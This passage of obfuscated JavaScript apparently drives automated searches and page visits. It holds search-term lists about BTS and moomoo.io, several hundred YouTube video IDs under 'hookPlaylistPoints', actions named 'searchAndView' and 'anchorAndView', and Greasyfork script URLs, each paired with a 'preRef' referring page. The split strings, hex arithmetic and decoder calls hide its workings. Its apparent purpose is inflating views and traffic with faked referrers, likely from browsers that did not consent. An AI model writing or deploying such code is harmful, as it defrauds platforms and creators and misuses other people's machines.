'zyenith']['repeatExte' + 'nd'](-0xddc + -0x15ed + 0x3 * 0xbf1)), searchTerms['push'](['moomoo.io\x20' + 'spyder']['repeatExte' + 'nd'](0xe14 + 0x2049 + -0x2e53)), searchTerms['push'](('bts,bts\x20v,' + 'jin\x20bts,bt' + 's\x20news,bts' + '\x20army,v\x20bt' + 's,rm\x20bts,b' + 'ts\x20rm,bts\x20' + 'jin,bts\x20sa' + 'd,sad\x20bts,' + 'bts\x20日本語,bt' + 's\x20韓国語,bts\x20' + '面白い,cctv\x20b' + 'ts,suga\x20bt' + 's,army\x20bts' + ',bts\x20live,' + 'kpop\x20bts,j' + 'imin\x20bts,j' + 'hope\x20bts,b' + 'ts\x20funny,b' + 'ts\x20日本語字幕,b' + 'ts\x20update,' + 'bts\x20future' + ',bts\x20eatin' + 'g,bts\x20stre' + 'ams,bts\x20日本' + '語字幕最新,taeh' + 'yung\x20bts,j' + 'ungkook\x20bt' + 's,bts\x20reac' + 'tion,bts\x20s' + 'truggle,bt' + 's\x20marriage' + ',bts\x20jungk' + 'ook,bts\x20面白' + 'い\x20日本語字幕,bt' + 's\x20playlist' + ',bts\x20play\x20' + 'game,bts\x20n' + 'ew\x20video,b' + 'ts\x20news\x20to' + 'day,bts\x20in' + 'terview')['split'](',')), searchTerms = searchTerms['flat'](-0x222 + 0x23 * -0x9b + 0x1756 * 0x1);
const hookPlaylistPoints = [
    'eHpl-BjXo5' + '8',
    '-PgyODlV6V' + '8',
    'S9EkXX0QYD' + 'U',
    'WvcG1OKdHW' + 'o',
    'b6gOcEwtZ8' + 'U',
    'apdtzA0Dzf' + 'k',
    'YiukDwYv2K' + '4',
    'zK-6UH5R5X' + '8',
    'bIXqNjtsEf' + '4',
    '3l253rESkw' + 'Q',
    'u6RVZKcN9z' + 'Q',
    '6ImZdwpdwT' + 'A',
    '0qPB5ANSBK' + 'c',
    '92duH3cqn1' + 'M',
    'b5lKI78fw3' + 's',
    'zpCCPZfP8L' + 'I',
    Y(0x3) + 'c',
    '2eWyJ8FBvQ' + '8',
    'O4-B3OFPDf' + 'Q',
    'JFcnGk0_u7' + 'o',
    'AP7d2Ghq6d' + 'U',
    'UizEAwrZAG' + 'I',
    '0FAi5-h8Hj' + '0',
    'CNqA6IYj17' + 'k',
    'tSiKyCpwnS' + 'Y',
    'OrglyeV5xP' + 'Y',
    'BXkB-g4eCc' + 's',
    'Y53CmmpbOJ' + 's',
    'sm5MLz_IrQ' + 'k',
    'EuciRU_Ska' + '0',
    'cCbDCTLyPc' + 'E',
    'Ox7Ng5T7bm' + 'c',
    'TXTaB-dQg-' + '0',
    '3jSWaWgr_A' + '0',
    'xT8nvuxCRB' + 'E',
    '3c4Ab9EmRg' + 'Y',
    '2kScgeNOpL' + '8',
    't22jhowMom' + 'c',
    'HbcDLgkmXL' + 's',
    'JsKZ41uTeg' + 'c',
    'dfU48FRgs0' + 'g',
    '3K9ILewnUk' + 'o',
    'QmKwnRiKhD' + 'k',
    'n3nVsWsL6I' + 'k',
    'noTs52D_Mw' + 'Y',
    'A0tDR4nTTK' + '0',
    '9eBwFca-B1' + '4',
    'moasU30H5l' + 'A',
    '_Mb8oQtSBW' + 'E',
    'TNGGOgwPtc' + 'M',
    '-pYA-gjkQ8' + 's',
    '5d-dB6tZZA' + 'o',
    '8H2AiOV0oE' + 'o',
    'mI7aiKDGde' + 'w',
    'D-IMDYrj35' + '4',
    'gKgFiEgghy' + 'g',
    'mjVwfjJ2nj' + 'k',
    '6auDBi-D2H' + 'M',
    'X89-SWNdIE' + 'k',
    'T5Pn4LhIwj' + 'M',
    'wVnKGSjY3i' + '8',
    'g11NJftxw1' + '4',
    '9zHirkfEKk' + 'k',
    'ZyGS_AMbIa' + '4',
    'yG6bwB17ZP' + 's',
    'aytHiLe0s6' + 'U',
    'cGe-Mpw_F1' + 'w',
    'eMK7xV_nxZ' + 'o',
    'epJ2MAKa1Y' + 'Q',
    '5BNbKKMUhE' + 'o',
    'oxpAvc6tDP' + '8',
    'jRcc-NIR2R' + 'I',
    '258btO4mFw' + '4',
    'pXjJAUvSbQ' + 'A',
    '63-irfPjh2' + 'c',
    'xbrDZAFf3Q' + 's',
    'MVHMtRlesU' + 'g',
    'zed05qfHMB' + 'I',
    'nkhkxKUHsY' + 'g',
    'n4cSAqR9H1' + 'Q',
    'gOUPndcj7z' + 'I',
    'n3HBTTDHoX' + '8',
    'XIgMFHPIXv' + '4',
    'oQHKMky-_K' + 'c',
    'zfDgTzZ2nh' + '0',
    '1PYettRo-D' + 'M',
    'jzuZuwF490' + '4',
    '2DAgWTlXae' + '8',
    'keouUYA5hI' + 'k',
    'F7i7wRlGCd' + 'c',
    'uToD2c0CdJ' + 'c',
    'Y8DzpdFZZ8' + '8',
    '-rrH657DAa' + 'o',
    'QTrEEWtDks' + '4',
    'TWTSnQDuad' + 'Y',
    'a0GUyvgnzg' + 'c',
    'eSReWZQyKd' + 'E',
    'D_5pMqdKSs' + '4',
    'm0ie8gHS00' + 'I',
    '6WosqMq9ej' + 'o',
    'i0afAOlon_' + '4',
    'j_fe6PfxW4' + 'Y',
    'GfPzi8SYr0' + 'w',
    'MSgZhNCwff' + 'M',
    'wxyBC_z6bI' + '8',
    'PkQpV-Fwhs' + 'k',
    'bVD6cWOVhN' + 'U',
    'mjZOpQlHbx' + 'M',
    'k_BXkcdbBO' + 'M',
    'X72oUsFV7q' + '0',
    'lONsILfq-W' + 'Y',
    'Bhe9PyM_s_' + 'Q',
    W(0x19) + 'Q',
    'h4TBnDkX4y' + 'o',
    'PNBJyHEkfk' + '4',
    'L3iHS__ufc' + 'g',
    'm7aliUAwm_' + 'Y',
    'FuPVf85zMi' + 'w',
    'gtupAeNTDS' + 'M',
    'yyJ8zkckoB' + '8',
    'ZDTESiN1eS' + 'w',
    Y(0x18) + 'o',
    'IAJqRxhVqO' + 'k',
    'KAgwII8TGj' + 'o',
    'o4tLCshmlb' + 'M',
    'dLj5fIupdA' + 'o',
    '_Xl_-b9P4U' + 'Q',
    'V3NxxpUUfW' + 'E',
    'J3ygeDEMnO' + 'w',
    'HcP_xmdwsl' + 'c',
    'M9g0h7px2_' + 'M',
    'b5WfUvcSgr' + 'U',
    'JGHnIshsoC' + 'E',
    'x2gfhCLHd9' + '4',
    'M5Fr8G0ma9' + 'o',
    '3sGeIBfFlC' + 'M',
    'k74y4KOJ2m' + '4',
    'pTHJB0S8E-' + 'U',
    'KaIrXJLfYP' + 'M',
    '0cisZkywhg' + 'Q',
    '0dVzItbl9E' + 'w',
    't0EqnhcSb1' + 's',
    'MuiXtvo1RY' + 'E',
    'Nj-3KC6knH' + 'w',
    'B19HbETNi5' + '8',
    'yKN_QkroH6' + 's',
    'U9ExFM1pji' + '0',
    'sONzDfjKhL' + '4',
    'n3Kj8zEfew' + 'U',
    'nXLGQ7QeoG' + 'Y',
    'OQFQiwiM-P' + 'Y',
    'UtPRpKRTtH' + 'U',
    'E56Myp0BzE' + 'E',
    '7DjOp_JM2Z' + 'w',
    'rNFLQFz_G1' + 'g',
    '1r2pKoVAdj' + 'M',
    'gm3eiv6UND' + 'M',
    'yOiROfjxzX' + 'o',
    'lt2AcxC_ap' + 'g',
    'bObEme2BDO' + 'E',
    '6Ut6HbJmW4' + 'w',
    'fUs0TtQQTo' + '0',
    '_phHS3FAgW' + 'Q',
    '1f8sU4l3dP' + '4',
    'HwTSLUd53K' + '8',
    'EpP2ymD_QG' + 'A',
    'TQ69QFqmbo' + 'I',
    'wA8BqUka_u' + '0',
    'bc8Ey-vuR5' + 'M',
    'PZ_uLi7ULl' + '0',
    'smu5FsnhwF' + '4',
    'dv1JluwoOb' + 'c',
    'nHotP0jbcv' + 'A',
    'iIjYNEmrVv' + 'M',
    'SeP-OZAiPb' + 'c',
    'v52PClvMFt' + 'k',
    '3loLqIPxTS' + '0',
    'jVu9mOzbSq' + 'U',
    '73SAN1vOrV' + 'k',
    'YLPxp4ntym' + 's',
    'YWXfelRk3b' + 'Q',
    'CsxlLMb6Uj' + 'o',
    'uafGOfwzpa' + 'Q',
    'XIr8qotHOI' + 'E',
    'EcoPCWC3Uh' + 'o',
    'AhOwyT8aIh' + 'g',
    't-Ox7lI5UH' + 's',
    'i08qNmssXe' + 'Q',
    'QrJIU09eD-' + 'g',
    'QvNNCQ-8Rp' + 'E',
    'k5gjnjDFAZ' + 's',
    'h_NQ3y1ek8' + 'U',
    'evPsJlNLy_' + '4',
    'qEPTydgwh4' + 's',
    'LB685ckhuf' + 'E',
    'Lj1EcSMGey' + '0',
    'OE19r7MIMW' + 'Q',
    'u8E3p0Vy-P' + 'Y',
    'f4a5OPFQa7' + 'k',
    'XDo7Q7yUEt' + 'k',
    'Vw_9zw0qHI' + 'c',
    'KGT5nbDsI_' + '8',
    'E008Eql59M' + 'Q',
    'wSOFdefX47' + 'A',
    '2xcv7q3QhR' + 'E',
    'hgfvmcBkc0' + '4',
    '0wP7csnX7k' + '4',
    'Xo0R8WiRSb' + '4',
    '8zNp8EOpGd' + '4',
    'sWYhIJZmoS' + 'E',
    'YdG8U1W-bX' + '0',
    'QeDsoSNml-' + 'c',
    'xW5q77El0x' + '8',
    'ZF14issJFE' + 'Y',
    'TRglEGLLKX' + 'o',
    'UE0SXc5k1e' + 'g',
    '6VY65D8f3D' + 'Q',
    'Iwxuob4fA8' + 'Q',
    'M4elJHCUIi' + 's',
    'GY9WWhO504' + 'k',
    'eErUSxmLDw' + '8',
    'ITQfAfzLj3' + 'I',
    'vbDrCL2FuL' + 'g',
    'KyQ_sUgtbK' + 'U',
    'lbEJcipUp8' + 'I',
    '2SqCn2LreN' + 'g',
    '1i-G2TUn41' + '0',
    's0ru6uK7vi' + '8',
    'gOxiE5UAAD' + 'w',
    'lx1rOOjekc' + '8',
    '5VYN2zA-Si' + 'k',
    'q9rLWEAzoo' + 'k',
    '4KSm3IY7Xz' + 'g',
    'fMqRu_ON-D' + 'E',
    'GfvShU6Sy9' + 'A',
    'OHzOmi1b60' + 'Y',
    'D9oTUKT-_n' + 'A',
    '_BrT2PlUiw' + '0',
    'kuuI4LzKgm' + 'I',
    '78dymyg88r' + 'M',
    'mi0nGt2B-q' + 'o',
    'HaI7BjnwnO' + 'c',
    'xlAEOkIuy7' + 'Y',
    '3VmtckvTXl' + 'U',
    'ed7TWHKDr4' + 'E',
    '2LfTjyVtbf' + 'U',
    'STHlCkloyv' + 'E',
    '-BI_-6YnM6' + 'Y',
    'LSK_G1qCQw' + 'M',
    '4tzqIl6EKV' + 'k',
    '9DshU55EiV' + '8',
    'mBtaEI_6e8' + 's',
    '960lvuduwY' + 'w',
    'XWJH-6J5Ee' + 'g',
    'XLS4qmyCAX' + 'g',
    '8cJDYeRiLn' + 'k',
    'cCaIVrltHz' + 'w',
    '8X2fF4pgM0' + 'E',
    '6s8Xm4wylr' + '4',
    'eFceshvavn' + 'o',
    '2h4g7euqR-' + 'U',
    'ujiBqXnn92' + '8',
    'w9F2NST-9j' + 's',
    'w-oc7F5Mmy' + 'U',
    'UYrmqL3cOD' + 'U',
    '4QB59etj0I' + 'o',
    'MY9MTNgXcN' + 'o',
    'ISBmcKDS5C' + '8',
    'ogIb7A7tvW' + '0',
    '-L583IZF6s' + 'k',
    'NbeKQq29ZL' + '0',
    'SPplDxd74F' + 's',
    'MHGV8QmpAz' + 'k',
    'iWzezFWpU7' + 'A',
    'NNCQt1rXXE' + 'Y',
    'bcb_ZhJJK8' + 'g',
    '3KoZGQiY6N' + 'o',
    'aSaXQH8F1_' + 'A',
    'V5nMOhI62o' + 'w',
    'JvlPjRUdId' + '0',
    '2gQHuClLCb' + '0',
    '5e-qDy-uUJ' + 'E',
    'oE8vC0QEWU' + 'E',
    '7cQken99yu' + 'o',
    'pmzu080j7r' + 'I',
    'sVy9F4whP6' + 'o',
    'MJrkylk7iE' + 'c',
    'XYjsTxi6oE' + '8',
    'mKlMouB6tp' + '0',
    'o2yunZQley' + 'A',
    'oRryU9F9Lv' + 's',
    'uzzK-052H0' + 'c',
    'VSvA4rCe-4' + 'M',
    'XURH2u_0fM' + 'I',
    'yfpVL2g_tk' + 'o',
    'AuEEjQ8x9o' + 'w',
    'wWkviY8zBr' + 'c',
    'zt_eubHWhx' + 'c',
    'O_7_BGU3u_' + '0',
    'QFDKBxmOn3' + 'Y',
    'w6gccNWXXv' + 'g',
    'VdNJxbrqdX' + 's',
    'wbi5Dxebvn' + 'I',
    'XEFOREYrJg' + 'k',
    'I2rcRta7WJ' + '0',
    'OP5KGfXHX_' + 'A',
    'w2MUMbbwlm' + 'o',
    'X3bF0nd6kf' + 'w',
    'WDDAhASf9j' + 'w',
    'fRwcV8gjbc' + 'w',
    '7T63gaRThr' + '0',
    'zC8AWIwhbf' + 's',
    'JSkVE0n-ee' + 'o',
    'qiQA5pWWRt' + 'U',
    'QdXCjZtfXu' + 'c',
    'vlBji8TOax' + 'o',
    'pBx_5CbIcp' + 'o',
    'L1Oy5F6ZMO' + 'Q',
    'P0NjLaBed-' + 'E',
    'DR16C4-keB' + '0',
    'LGmpIpu9eD' + 'w',
    'rNkX_A4kBA' + 'Q',
    'QztVMjrEk4' + '0',
    'uOM6m6KL5d' + '4',
    'g-Aju8xrrO' + 'E',
    'DfkDbFk_x9' + '8',
    'Y4NLDaowD6' + 'I',
    'ALSZnqQTuJ' + 'o',
    'xUmB6BpZBE' + 'w',
    'SxNOcZ1s85' + '8',
    '-noeCjO416' + 'k',
    'taPJqXBI8V' + 'Y',
    'YxqbkMi1Is' + '4',
    'vnJTyve2r-' + '4',
    '44lRVYQ38E' + 'Q',
    X(0x1a, '$n3*') + 'g',
    'jNjREs7ODT' + 'g',
    'U30ToJo3dd' + 'k',
    'rm7lNIIOQC' + 'Y',
    'mGU6sOPlYv' + 'c',
    '6pwxUXdt6T' + 'Q',
    '6MkJRee35a' + 'Q',
    'LVbf7U9WAI' + 'c',
    'gPbhFvEeJ3' + 'M',
    'LWXAxz0MiH' + 'A',
    'L0KQJqfwJJ' + 'Y',
    'GWr33_u0VK' + 'c',
    '4ud3ZPfWkH' + 's',
    'dxSrySC4XM' + 'c',
    'iIM2KZC69W' + '0',
    '8DuJ3BAwME' + 'o',
    'm3BAhe1wsl' + 'Y',
    '02U_3pAZxM' + '8',
    '0e7nidPa97' + 'g',
    'TixW__6Eer' + 'o',
    'q46W8MTRTC' + 'E',
    'Jdxp04Je1O' + 'w',
    'HfP4TO3gfN' + '0',
    '4dUJaeB0qL' + '8',
    'xnL-fRJ3RZ' + 'o',
    'yJbD0Df45u' + 'Q',
    '-pGw8RkSSB' + 'k',
    '7cy86Njsis' + 'M',
    'jbgqvxtauo' + '4',
    'N8M00JjSVI' + 'I',
    W(0xc) + 'c',
    'eHwcx94wcp' + 's',
    'olDgVFgAgP' + 'o',
    'eAAd5BmzXz' + 'M',
    'xgTjQ2sGXd' + '4',
    'ipny6JUbzw' + 's',
    'WOwQ0UxbRj' + '4',
    'h0PKFed2GB' + 's',
    'JxdOrgzq7Z' + '8',
    '-VgpSWWW-8' + 'w',
    '-ix4OizkAn' + 's',
    'd3CRE9y3YV' + 's',
    '4QZlfXxorJ' + 'o',
    'YlDpg8aCs5' + 'M',
    'Qe5WT22-AO' + '8',
    'b_rjBWmc1i' + 'Q',
    '9yjZpBq1XB' + 'E',
    'hPx-RiBKXt' + 'Q',
    'UMqLDhl8PX' + 'w',
    'DlJEt2KU33' + 'I',
    'BWeqoARup-' + 'Q',
    '2Dx76lD8Sc' + 'c',
    'j_nI6G3ZDi' + 'E',
    'zvcUYYN1sx' + 'w',
    'cWRkYo1S3L' + '4',
    'cWRkYo1S3L' + '4',
    'bxC_PN3SRv' + 'I',
    '94m93T_5JL' + 'M',
    'RBSHAH4iWU' + '8',
    'RBSHAH4iWU' + '8',
    'RBSHAH4iWU' + '8',
    'bo9fTeXvSi' + 'A',
    'z6LqXiAK-8' + '0',
    '5tbOspjJ5f' + '0',
    'twQ6kKjtBk' + 'Y',
    'Ig17K38Fy0' + 'Y',
    'ZdlrVDwn_a' + '4',
    'aCT4Lddunx' + 'g',
    'acAvMGQtln' + 'M',
    '8XkcbdSRdO' + '0',
    '0e3GPea1Ty' + 'g',
    'zxYjTTXc-J' + '8',
    '9bqk6ZUsKy' + 'A',
    'plSyrHqUh7' + '8',
    'HkvQywg_uZ' + 'A',
    'lADBHDg-Jt' + 'A',
    'I2O7blSSzp' + 'I',
    'kd2KEHvK-q' + '8',
    'CbUjuwhQPK' + 's',
    'fb7T1v_VHp' + 'E',
    'SpeSpA3e56' + 'A',
    'RQdxHi4_Pv' + 'c',
    'nx2-4l4s4N' + 'w',
    'tUTCq3iiw_' + '4',
    'VDa5iGiPgG' + 's',
    'S-sJp1FfG7' + 'Q',
    'Hm1YFszJWb' + 'Q'
  ],
  GlobalActions = [
    searchAndView,
    anchorAndView,
    frontScreenActions,
    keyWatch
  ],
  wait = f => new Promise(h => setTimeout(h, f)),
  scriptTargets = [{
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/457024' + '-surviv-io' + '-xclient-b' + 'eta',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/surviv.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/404065' + '-%E7%BD%91' + '%E9%A1%B5%' + 'E7%B2%BE%E' + '7%81%B5',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/51cto.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/22545-' + 'anti-bd-re' + 'direct',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/by-' + 'site/baidu' + '.com?page=' + '4'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/385' + '044-zhihu-' + 'anonymous-' + 'users',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/by-' + 'site/zhihu' + '.com'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/302' + '36-zhihu-l' + 'ink-fix',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/by-' + 'site/zhihu' + '.com'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/435948' + '-btb',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/baidu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430335' + '-wb-script',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/zhihu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430572' + '-beautify-' + 'the-baidu-' + 'homepage',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/zhihu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/410781' + '-diep-io-a' + 'nti-afk-ti' + 'meout',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/diep.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/1196-v' + 'iew-youtub' + 'e-tags',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/21012-' + 'youtubeext',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/20798-' + 'youtube-hi' + 'de-volume-' + 'control',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/9090-y' + 'outube-add' + '-video-id-' + 'text-field',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/20710-' + 'calm-down-' + 'youtube',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/39544-' + 'youtube-po' + 'lymer-disa' + 'ble',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/412698' + '-youtube-a' + 'uto-skip-a' + 'ds',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/413965' + '-youtube-l' + 'ike-dislik' + 'e-video-an' + 'd-skip-ad-' + 'keyboard-s' + 'hortcuts-f' + 'ork-from-n' + 'erevar009',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/39919-' + 'youtube-su' + 'ggested-vi' + 'deo-hider-' + 'for-youtub' + 'e-classic',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + X(0x17, 'Ha7d') + 'pts/414756' + '-requestho' + 'ok',
      'preRef': 'https://gr' + Y(0x6) + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/414876' + '-live-chat' + '-mod-calib' + 'er',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/40462-' + 'youtube-no' + '-resume',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/40517-' + 'youtube-re' + 'sume',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/415706' + '-moomoo-io' + '-remove-co' + 'okie-prefe' + 'rences-tab',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/405955' + '-web-secur' + 'ity',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/381682' + '-html5%E8%' + X(0x8, 'z)1s') + '2%91%E6%92' + '%AD%E6%94%' + 'BE%E5%99%A' + '8%E5%A2%9E' + '%E5%BC%BA%' + 'E8%84%9A%E' + '6%9C%AC',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/429635' + '-always-on' + '-focus',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + W(0x0) + 'rg/en/scri' + 'pts/30310-' + Y(0xe),
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/455853' + '-%E7%BD%91' + '%E9%A1%B5%' + 'E8%AE%BF%E' + '9%97%AE%E5' + '%8A%A0%E9%' + '80%9F%E5%9' + '9%A8',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/454941' + '-hcaptcha-' + 'captcha-so' + 'lver-by-no' + 'captchaai',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/374794' + '-lift-web-' + 'restrictio' + 'ns-io-game' + '-mods-moom' + 'oo-io-krun' + 'ker-io-ad-' + 'link-bypas' + 'ser-adbloc' + 'k-more',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/baidu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/374794' + '-lift-web-' + 'restrictio' + 'ns-io-game' + '-mods-moom' + 'oo-io-krun' + 'ker-io-ad-' + 'link-bypas' + 'ser-adbloc' + 'k-more',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/374794' + '-lift-web-' + 'restrictio' + 'ns-io-game' + '-mods-moom' + 'oo-io-krun' + 'ker-io-ad-' + 'link-bypas' + 'ser-adbloc' + 'k-more',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/discord.' + 'com'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/407994' + '-mope-io-a' + 'uto-dive-a' + 'uto-boost-' + 'see-people' + '-underwate' + 'r-see-invi' + 'sible-play' + 'ers-remove' + '-ads',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/mope.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/424066' + '-pancake-m' + 'od-katana-' + 'musket-aut' + 'oheal-anti' + '-insta-sta' + 'rter-resou' + 'rces-and-m' + 'ore',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/429746' + '-best-moom' + 'oo-io-hack' + '-mod-2022-' + '2023',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/405943' + '-moomoo-io' + '-agar-io-s' + 'urviv-io-s' + 'lither-io-' + 'diep-io-gl' + 'obal-name-' + 'manager-kr' + 'unker-comi' + 'ng-soon',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/456855' + '-anti-anti' + '-adblock-v' + '1-all-site' + 's',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + W(0xd) + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/454134' + '-moomoo-io' + '-dune-mod-' + 'autoheal-a' + 'utobreak-f' + 'ast-and-mo' + 're',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/424447' + '-xtaming-c' + 'lient-tami' + 'ng-io-hack' + 's',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/taming.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/451547' + '-moomoo-io' + '-insane-mo' + 'd-beta-too' + '-fast-read' + '-descripti' + 'on',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/424655' + '-i30cps-ut' + 'ility-mod',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/448601' + '-%E5%8A%9B' + '%E6%89%A3%' + 'E9%A2%98%E' + '7%9B%AE%E8' + '%BD%ACmark' + 'down',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/leetcode' + '.cn'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/445806' + '-moomoo-io' + '-auto-heal',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/434199' + '-moomoo-io' + '-helper-to' + '-become-pr' + 'o',
